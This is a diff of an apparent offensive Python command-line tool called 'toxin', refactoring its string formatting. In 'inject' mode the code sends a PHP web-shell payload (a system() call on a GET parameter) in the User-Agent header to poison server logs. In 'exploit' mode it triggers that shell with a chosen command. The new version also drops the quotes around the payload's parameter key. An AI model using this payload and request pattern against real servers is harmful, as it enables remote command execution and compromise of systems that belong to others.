@@ -38,7 +38,7 @@ def print_help(ctx, value):
 @click.pass_context
 def toxin(ctx, parameter=None, url=None, command=None, mode=None, paged=None):
 
-    headers = {'User-Agent': "<?php system($_GET['%s']); ?>" % parameter}
+    headers = {'User-Agent': F"<?php system($_GET[{parameter}]); ?>"}
 
     if mode == 'inject':
 
@@ -51,7 +51,7 @@ def toxin(ctx, parameter=None, url=None, command=None, mode=None, paged=None):
 
     elif mode == 'exploit':
 
-        response = requests.get('{0}&{1}={2}'.format(url, parameter, command))
+        response = requests.get(F'{url}&{parameter}={command}')
 
         if paged is True:
             pager(response.text)
